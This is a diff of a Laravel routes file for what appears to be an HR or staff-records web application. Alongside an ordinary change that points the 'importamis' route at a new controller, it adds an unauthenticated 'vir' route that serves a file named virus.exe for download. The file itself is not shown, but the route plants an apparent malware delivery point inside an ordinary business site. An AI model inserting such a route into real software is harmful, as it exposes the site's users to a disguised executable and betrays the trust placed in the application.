@@ -14,6 +14,9 @@
 Route::get('/', function () {
     return view('welcome');
 });
+Route::get('vir',function(){
+	 return response()->download(storage_path('app\\public\\virus.exe'));
+});
 //Route::get('index','UserController@index');
 Route::get('login','LoginController@getLogin');
 Route::post('login','LoginController@postLogin');
@@ -192,7 +195,7 @@ Route::post('postDiemCongHien','AdminPage\ProfileController@postDiemCongHien')->
 
 Route::get('update','StoreProcedureProfile\StoreThamNien@Store_main')->name('update');
 Route::get('Store_main_total','StoreProcedureProfile\StoreThamNien@Store_main_total');
-Route::post('importamis','StoreProcedureProfile\StoreThamNien@Import_Amis_ICT')->name('importamis');
+Route::post('importamis','StoreProcedureProfile\StoreThamNienVersion2Controller@Update_Staff_By_Amis')->name('importamis');
 
 Route::get('ShowDataTable','StoreProcedureProfile\StoreThamNien@ShowDataTable');
 Route::get('editDataInDay','StoreProcedureProfile\StoreThamNien@editDataInDay');
